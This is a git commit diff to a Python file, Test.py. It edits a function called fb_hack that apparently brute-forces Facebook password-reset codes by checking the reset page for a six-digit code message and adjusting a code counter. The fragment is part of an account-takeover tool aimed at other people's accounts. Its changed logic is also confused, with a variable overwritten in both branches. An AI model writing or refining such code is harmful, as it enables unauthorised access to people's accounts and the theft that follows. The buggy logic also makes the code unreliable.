b0287371b124c373ad33451c131d4122392059ea
krarktel112 <krarktel@gmail.com>
2024-09-01 13:54:01 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -133,9 +133,13 @@ def fb_hack(email, codex):
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   if check1 != test:
-    print(check1)
-    reset = int(codex) - 99000000
-    
+    if int(codex) > 999999:
+      reset = int(codex) - 99000000
+      print(check1)
+      reset = int(codex)
+    else:
+      print(check1)
+      reset = int(codex)
   else:
     print(check2)
     reset = int(codex)
